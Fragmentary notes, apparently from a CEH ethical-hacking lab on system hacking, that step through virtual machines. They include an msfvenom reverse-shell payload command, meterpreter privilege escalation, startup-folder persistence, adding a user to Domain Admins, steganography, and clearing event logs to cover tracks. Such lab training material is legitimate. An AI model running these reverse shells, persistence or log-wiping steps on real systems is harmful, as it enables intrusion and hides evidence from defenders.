...
10.10.1.13 is the IP address of the host machine (here, the Parrot Security machine).
	...
	32. Leave the Windows 11 machine running and click Parrot Security switch to the Parrot Security machine.
...
When the above script is executed, it sends random bytes of data to the target vulnerable server, which causes a buffer overflow in the stack.
	...
	79. Click Windows 11 switch to the Windows 11 machine.
...
The screenshot here might differ from the image on your screen, depending upon the user activities you performed earlier.
	...
	53. Now, before going to the next task, End the lab and re-launch it to reset the machines. To do so, click the Menu icon ( 
...
Here, we will use NTFS streams to hide a malicious file on the target system.
	1. click Windows Server 2019 to switch to the Windows Server 2019 machine. Click Ctrl+Alt+Delete, by default, Administrator user profile is selected, type Pa$$w0rd in the Password field and press Enter to login.
...
Here, we will hide data using the Whitespace steganography tool Snow.
	...
	2. Click Ctrl+Alt+Delete to activate the machine, by default, Admin user profile is selected, type Pa$$w0rd in the Password field and press Enter to login.
	...
	5. Now, Click Search icon ( 
	
	) on the Desktop. Type cmd in the search field, the Command Prompt appears in the results, click Open to launch it.
...
Here, we will show how text can be hidden inside an image using the OpenStego and StegOnline tools.
	...
	) on the Desktop. Type openstego in the search field, the OpenStego appears in the results, click OpenStego to launch it.
...
If a Opening Island.png pop-up appears, select Save File radio button and click on OK.
...
You can also download the extracted data by clicking the Download Extracted Data button.
...
If you get Exploit completed, but no session was created message without any session, type exploit in the console again and press Enter.
	...
	32. Type getsystem -t 1 and press Enter to elevate previleges.
	
	33. Now type getuid and press Enter, The meterpreter session is now running with system previleges.
...
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe
	...
	40. Click Windows 11 to switch to Windows 11 machine and sign into Admin account
	41. After signing into the Admin account restart the Windows 11 machine.
	
	42. Click on Parrot Security to switch to Parrot Security machine. Now open another terminal window with root privileges and type msfconsole and press Enter.
	...
	48. Click Windows 11 to switch to Windows 11 machine login to Admin account and restart the machine so that the malicious file that is placed in the startup folder is executed.
	
	49. Now click Parrot Security to switch to the Parrot Security machine and you can see that the meterpreter session is opened.
It takes some time for the session to open.
	
	50. Type getuid and press Enter, we can see that we have opened a reverse shell with admin previleges.
...
To create a new directory to share the Exploit.exe file with the target machine and provide the permissions, use the below commands:
	...
	15. Click Windows Server 2022 to switch to Windows Server 2022 machine. Click Ctrl+Alt+Delete. By default CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter to login.
	...
	20. Click Parrot Security to switch to Parrot Security machine and you can see that meterpreter session has already opened.
	...
	29. To navigate to the PowerView folder in the target machine, in the powershell type cd C:\Users\Administrator\Downloads\PowerView and press Enter.
...
Microsoft doesn’t recommend the modification of this setting, as this might cause performance issues in relation to LSASS process across the domain.
	...
	35. Now, click Windows Server 2022 to switch to the Windows Server 2022 machine and open Server Manager window. In the Server Manager window click on Tools -> Active Directory Users and Computers.
...
It will take approximately 3 minutes for the user Martin to be added as a member in the directory.
	
	39. Click Parrot Security to switch to Parrot Security machine and in the meterpreter shell enter the following command and press Enter, to add Martin to Domain Admins group as he is already having all the permissions.
net group “Domain Admins” Martin /add /domain
	
	40. Click Windows Server 2022 to switch to Windows Server 2022 machine and in the Active Directory Users and Computers window, click on Users folder right-click on Martin J user name and click on properties.
...
If a Server Manager window appears close it.
	...
	50. Click Parrot Security to switch to the Parrot Security machine and restart the machine. To do that click Menu button at the bottom left of the Desktop, from the menu and click Turn off the device icon. A Shut down this system now? pop-up appears, click on Restart button.
Question 6.3.7.1
...
To create a new directory to share the malicious files with the target machine and provide the permissions, use the below commands:
	• Type mkdir /var/www/html/share and press Enter to create a shared folder
	• Type chmod -R 755 /var/www/html/share and press Enter
	• Type chown -R www-data:www-data /var/www/html/share and press Enter
	...
	18. Click Windows Server 2019 to switch to Windows Server 2019 machine. Click Ctrl+Alt+Delete. By default Administrator account is selected, type Pa$$w0rd in the Password field and press Enter to login.
...
Save the downloaded files in the Downloads folder.
	
	
	
	22. Navigate to Downloads and double-click the Payload.exe file. The Open File - Security Warning window appears; click Run.
	
	23. Click Parrot Security to switch to Parrot Security machine and you can see that meterpreter session has already opened.
...
It will take approximately 5 minutes for the script to run.
	...
	37. Now click Windows Server 2019 to switch to the Windows Server 2019 machine and restart the machine.
If a pop-up appears select Other (Unplanned) and click on Continue.
	
	38. Click on Parrot Security to switch to Parrot Security machine, We can see that the previous session will be closed.
	
	39. Navigate to the second terminal and we can see that the meterpreter session is opened.
It will take approximately 5 minutes for the session to open.
...
If ceh-tools 10.10.1.11 option is not present then follow the below steps:
	• Click the Places menu present at the top of the Desktop and select Network from the drop-down options.
	• The Network window appears; press Ctrl+L. The Location field appears; type smb://10.10.1.11 and press Enter to access Windows 11 shared folders.
	• The security pop-up appears; enter the Windows 11 machine credentials (Username: Admin and Password: Pa$$w0rd) and click Connect.
	• The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder.
...
The password that you type will not be visible in the terminal window.
	...
	24. Navigate to CEHv12 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP and copy the covert_tcp.c file.
...
Here, we will use Auditpol to view, enable, and clear audit policies.
	...
	) on the Desktop. Type cmd in the search field, the Command Prompt appears in the results, click Run as administrator to launch it.
...
From <https://labclient.labondemand.com/Instructions/47f122f4-879c-43ac-89fa-be3075e59ea0> 
...
There are various Windows utilities that can be used to clear system logs such as Clear_Event_Viewer_Logs.bat, wevtutil, and Cipher. Here, we will use these utilities to clear the Windows machine logs.
	1. In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat. Right-click Clear_Event_Viewer_Logs.bat and click Run as administrator.
...
If a User Account Control pop-up appears, click Yes.
	...
	15. Now, let us hide files in Parrot Security Machine, click Parrot Security to switch to Parrot Security Machine.
...
Here, we will use CCleaner to clear the system logs of the Windows machine.
	1. Click Windows 11 to switch to the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\CCleaner; double-click ccsetup591_pro_trial.exe.
If a User Account Control pop-up appears, click Yes.
...
![image](https://github.com/user-attachments/assets/76ab4b81-3157-4cba-b37f-ed82f2278376)
